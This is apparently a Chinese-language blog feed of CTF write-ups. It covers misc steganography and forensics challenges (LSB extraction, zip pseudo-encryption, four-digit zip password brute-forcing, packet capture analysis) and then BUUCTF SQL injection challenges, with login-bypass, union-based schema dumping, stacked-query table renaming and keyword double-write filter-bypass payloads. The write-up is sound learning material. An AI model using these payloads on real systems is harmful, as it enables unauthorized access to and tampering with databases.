title="LSB"></a>LSB</h4><p><code>StegSolve</code>打开图片，在不同通道中切换查看图片，发现<code>blue0,green0,red0</code>和原始图片不一样</p><p><img src="/2022/12/13/CTF-Misc/14.png" alt="14"></p><p><img src="/2022/12/13/CTF-Misc/15.png" alt="15"></p><p><img src="/2022/12/13/CTF-Misc/16.png" alt="16"></p><p><img src="/2022/12/13/CTF-Misc/17.png" alt="17"></p><p>使用<code>Data Extract</code>功能进行提取，保存成图片，发现是二维码，扫描后获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/18.png" alt="18"></p><h4 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h4><p>下载后发现文件加密，看到题目提示是zip伪加密，因此不需要使用<code>fcrack</code>爆破。首先了解一下zip文件。</p><p>一个zip文件由三部分组成</p><ul><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志</li></ul><p>具体组成如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区： </span><br><span class="line">    50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line">    14 00：解压文件所需 pkware 版本 </span><br><span class="line">    00 00：全局方式位标记（有无加密） </span><br><span class="line">    08 00：压缩方式 </span><br><span class="line">    5A 7E：最后修改文件时间 </span><br><span class="line">    F7 46：最后修改文件日期 </span><br><span class="line">    16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">    19 00 00 00：压缩后尺寸（25） </span><br><span class="line">    17 00 00 00：未压缩尺寸（23） </span><br><span class="line">    07 00：文件名长度 </span><br><span class="line">    00 00：扩展记录长度 </span><br><span class="line"></span><br><span class="line">压缩源文件目录区： </span><br><span class="line">    50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line">    3F 00：压缩使用的 pkware 版本 </span><br><span class="line">    14 00：解压文件所需 pkware 版本 </span><br><span class="line">    00 00：全局方式位标记</span><br><span class="line">    08 00：压缩方式 </span><br><span class="line">    5A 7E：最后修改文件时间 </span><br><span class="line">    F7 46：最后修改文件日期 </span><br><span class="line">    16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line">    19 00 00 00：压缩后尺寸（25） </span><br><span class="line">    17 00 00 00：未压缩尺寸（23） </span><br><span class="line">    07 00：文件名长度 </span><br><span class="line">    24 00：扩展字段长度 </span><br><span class="line">    00 00：文件注释长度 </span><br><span class="line">    00 00：磁盘开始号 </span><br><span class="line">    00 00：内部文件属性 </span><br><span class="line">    20 00 00 00：外部文件属性 </span><br><span class="line">    00 00 00 00：局部头部偏移量 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">压缩源文件目录结束标志： </span><br><span class="line">    50 4B 05 06：目录结束标记 </span><br><span class="line">    00 00：当前磁盘编号 </span><br><span class="line">    00 00：目录区开始磁盘编号 </span><br><span class="line">    01 00：本磁盘上纪录总数 </span><br><span class="line">    01 00：目录区中纪录总数 </span><br><span class="line">    59 00 00 00：目录区尺寸大小 </span><br><span class="line">    3E 00 00 00：目录区对第一张磁盘的偏移量 </span><br><span class="line">    00 00：ZIP 文件注释长度</span><br></pre></td></tr></table></figure><p>因此我们通过<code>hex fiend</code>打开zip文件可以发现。压缩源文件数据区的全局方式位标记为<code>0900</code>,压缩源文件目录区的全局方式位标记为<code>0900</code>，而对于<code>zip</code>伪加密文件，我们只需要将<strong>压缩源文件数据区和压缩源文件目录区</strong>的全局方式位标记从<code>0900</code>或者<code>0100</code>修改为<code>0000</code>就可以移除密码，反之则可以添加密码。</p><p><img src="/2022/12/13/CTF-Misc/19.png" alt="19"></p><h4 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h4><p>wireshark打开过滤post请求，发现有一个jepg格式的照片，打开查看。</p><p><img src="/2022/12/13/CTF-Misc/20.png" alt="20"></p><p>获取到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/21.png" alt="21"></p><h4 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h4><p><code>StegSolve</code>打开图片，在不同通道中切换查看图片，发现<code>blue0,green0,red0</code>和原始图片不一样</p><p><code>data extract</code>获取<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/22.png" alt="22"></p><h4 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h4><p><code>binwalk</code>分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">38689         0x9721          Zip archive data, encrypted at least v2.0 to extract, compressed size: 50, uncompressed size: 38, name: ningen.txt</span><br><span class="line">38871         0x97D7          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>发现存在zip文件。foremost分离</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 9e3ec8c2-38c7-41cf-b5d7-abe7872de4c3.jpg</span><br><span class="line">|foundat=ningen.txt|���B��W��u���:)�ם[Rk�3�_��W�i�&#125;Ćne%�3�]��BPK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>zip下有一个<code>ningen.txt</code>文件，但是被加密了，由题目可知是四位数密码，fcrack爆破获取<code>flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u output/zip/00000075.zip</span><br><span class="line">PASSWORD FOUND!!!!: pw == 8368</span><br></pre></td></tr></table></figure><h4 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h4><p>追踪tcp数据流获取flag</p><p><img src="/2022/12/13/CTF-Misc/23.png" alt="23"></p><h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><p>图片下载下来binwalk查看发现存在压缩文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk 42011487927629132.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 664 x 586, 8-bit/color RGB, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, default compression</span><br></pre></td></tr></table></figure><p>stegsolve最低位分析，根据标识头发现是zip文件</p><p><img src="/2022/12/13/CTF-Misc/24.png" alt="24"></p><p>修改下载下来的图片后缀为zip并解压，发现里面存在一个1的文件，查看文件属性发现是可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % file 1</span><br><span class="line">1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8df45089fa39fec83423ec37a944e81065d16bee, not stripped</span><br></pre></td></tr></table></figure><p><code>Ghidra</code>打开反编译后看到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/25.png" alt="25"></p><h4 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h4><p>下载图片后追踪http流，发现有一串base64编码数据，以<code>/9j/</code>开头，属于图片格式，直接base64转图片，看到flag</p><p><img src="/2022/12/13/CTF-Misc/26.png" alt="26"></p><p><img src="/2022/12/13/CTF-Misc/27.png" alt="27"></p><h4 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h4><p>Audacity打开发现存在摩斯电码，解密得到flag</p><p><img src="/2022/12/13/CTF-Misc/28.png" alt="28"></p><h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>下载图片后<code>binwalk</code>分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % binwalk snake.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">2925          0xB6D           Copyright string: "Copyright Apple Inc., 2015"</span><br><span class="line">278260        0x43EF4         Zip archive data, at least v1.0 to extract, compressed size: 82, uncompressed size: 82, name: key</span><br><span class="line">278375        0x43F67         Zip archive data, at least v1.0 to extract, compressed size: 48, uncompressed size: 48, name: cipher</span><br><span class="line">278632        0x44068         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><p>修改后缀后解压</p><p>发现有俩文件一个<code>cipher</code>一个<code>key</code>，将<code>key</code>用<code>hex fiend</code>打开发现一串<code>base64</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</span><br></pre></td></tr></table></figure><p>解码结果为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is Nicki Minaj's favorite song that refers to snakes?</span><br></pre></td></tr></table></figure><p><code>google</code>搜索这个人和蛇有关的歌曲，名为<code>anaconda</code></p><p><img src="/2022/12/13/CTF-Misc/29.png" alt="29"></p><p>加密算法是什么呢？百思不得其解，网上查了后发现蛇还有个英文名叫<code>Serpent</code>正好也对应一个加密算法。。。</p><p><code>serpent</code>在线加解密：<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p>得到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/30.png" alt="30"></p><h4 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h4><p>下载后发现zip是伪加密，直接修改后打开，里面一张照片一个文件，文件内容如下</p><p><img src="/2022/12/13/CTF-Misc/31.png" alt="31"></p><p>没看明白啥意思，图片我<code>binwalk hexfiend stegsolve</code>都无果</p><p>看了writeup后知道了一个网站。。。。</p><p>与佛论禅：<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>得到<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/32.png" alt="32"></p><h4 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h4><p>下载文件后直接wireshark打开，根据题目应该是POST请求，直接过滤post请求</p><p><img src="/2022/12/13/CTF-Misc/33.png" alt="33"></p><p>过滤之后追踪http请求流，发现了两段可以的请求</p><p>第一段post参数有<code>z1</code>和<code>z2</code></p><p><img src="/2022/12/13/CTF-Misc/34.png" alt="34"></p><p>将<code>z1 base64</code>解码得到一个图片地址</p><p><img src="/2022/12/13/CTF-Misc/36.png" alt="36"></p><p><code>z2</code>是很长的一段16进制hex码，以<code>FFD8</code>开头以<code>FFD9</code>结尾，可以判断出是<code>jpeg</code>图片格式的开头和结尾，于是找一个在线网站直接转换</p><p>hexadecimal-&gt;image:<a href="https://codepen.io/abdhass/full/jdRNdj" target="_blank" rel="noopener">https://codepen.io/abdhass/full/jdRNdj</a></p><p><img src="/2022/12/13/CTF-Misc/37.png" alt="37"></p><p>第二段post请求中存在其他文件</p><p><img src="/2022/12/13/CTF-Misc/35.png" alt="35"></p><p><code>foremost</code>分离</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost 666666.pcapng</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: 666666.pcapng</span><br><span class="line">|foundat=flag.txtC����cS�J��Ea�v�</span><br><span class="line">                                 ��&amp;e$K��2%�$��,�=�J��1p��p46PK?</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>输入上面图片中的密码，拿到<code>flag</code></p><h4 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h4><p>两张gif图，第二张副本图片损毁了，<code>hex fiend</code>打开后发现缺少<code>gif</code>头，标识为<code>47 49 46 38</code>，添加<code>gif</code>头后可以正常打开，看到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;金三胖&quot;&gt;&lt;a href=&quot;#金三胖&quot; class=&quot;headerlink&quot; title=&quot;金三胖&quot;&gt;&lt;/a&gt;金三胖&lt;/h4&gt;&lt;p&gt;zip下载后有一张gif，直接拖入到StegSolve中分帧查看，得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/12/
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF SQL WriteUp</title>
    <link href="elssm.github.io/2022/12/07/CTF-SQL-WriteUp/"/>
    <id>elssm.github.io/2022/12/07/CTF-SQL-WriteUp/</id>
    <published>2022-12-07T02:46:49.000Z</published>
    <updated>2022-12-13T01:46:05.936Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ctf sql注入学习</p><p>题目地址：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>启动靶机输入1，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/1.png" alt="1"></p><p>输入<code>1&#39;</code>，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/2.png" alt="1"></p><p>输入<code>1&#39;#</code>，回显如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/3.png" alt="1"></p><p>发现存在sql注入，进而使用<code>order by</code>爆列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 1;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>无报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/4.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 2;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>无报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/5.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>报错</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/6.png" alt="1"></p><p>因此字段有两列。</p><p>使用，<code>union select</code>回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现有正则表达式进行过滤</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/7.png" alt="1"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>转向堆叠注入</p><p>查看数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/8.png" alt="1"></p><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现有两张表，分别是<code>1919810931114514</code>和<code>words</code></p><p><img src="/2022/12/07/CTF-SQL-WriteUp/9.png" alt="1"></p><p>获取每张表的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/10.png" alt="1"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/11.png" alt="1"></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>根据两张表的字段数可以判断出输入框查询的是<code>words</code>表。</p><p>因此我们的思路是将<code>1919810931114514</code>表名改为<code>words</code>表，再将表中的<code>flag</code>字段改为<code>id</code>字段后再次进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> words2;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>修改后查看是否修改成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现已经修改成功</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/12.png" alt="1"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>查看flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/13.png" alt="1">flag为<code>flag{1f13cb4b-44b0-49e7-8ca5-02499e7085df}</code></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>堆叠注入</p><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/15.png" alt="1"></p><p>获取<code>flag</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/14.png" alt="1"></p><p>flag为<code>flag{e0fd544e-1ad2-4725-9a41-5de52bc11c9d}</code></p><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><h4 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h4><p>启动靶机，发现需要用户名密码登陆，直接万能密码尝试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' or '1'='1'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/16.png" alt="16"></p><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>接着通过<code>order by</code>爆破列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin' order by 1<span class="comment">#</span></span><br><span class="line">admin' order by 2<span class="comment">#</span></span><br><span class="line">admin' order by 3<span class="comment">#</span></span><br><span class="line">admin' order by 4<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>4的时候报错，说明有3列</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/17.png" alt="17"></p><p>回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/18.png" alt="18"></p><h4 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h4><p>查询数据库和版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/19.png" alt="19"></p><p>查询数据库下的数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/20.png" alt="20"></p><p>查询指定表名下的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'geekuser'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/21.png" alt="21"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'l0ve1ysq1'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/22.png" alt="22"></p><h4 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h4><p>查询指定数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin ' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到<code>flag</code>为<code>flag{b9c4667a-4a05-441b-b100-a2106627c639}</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;b9c4667a-4a05-441b-b100-a2106627c639&#125;'</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><h4 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h4><p>万能密码失效，对于一些sql关键字进行了过滤</p><p>尝试双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>发现列数不匹配</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/23.png" alt="23"></p><p>回显爆破</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/24.png" alt="24"></p><p>查询数据库下的数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>报错如下</p><p><img src="/2022/12/07/CTF-SQL-WriteUp/25.png" alt="25"></p><p>继续双写绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/12/07/CTF-SQL-WriteUp/26.png" alt="26"></p><p>查询指定表名下的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'<span class="comment">#</span></span><br><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>上面两张表均没有flag的信息</p><p>猜测存在其他数据库中</p><h4 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h4><p>获取所有数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到的结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,performance_schema,test,ctf,geek</span><br></pre></td></tr></table></figure><p>猜测<code>ctf</code>数据库中存在<code>flag</code></p><p>查看<code>ctf</code>数据库中的所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 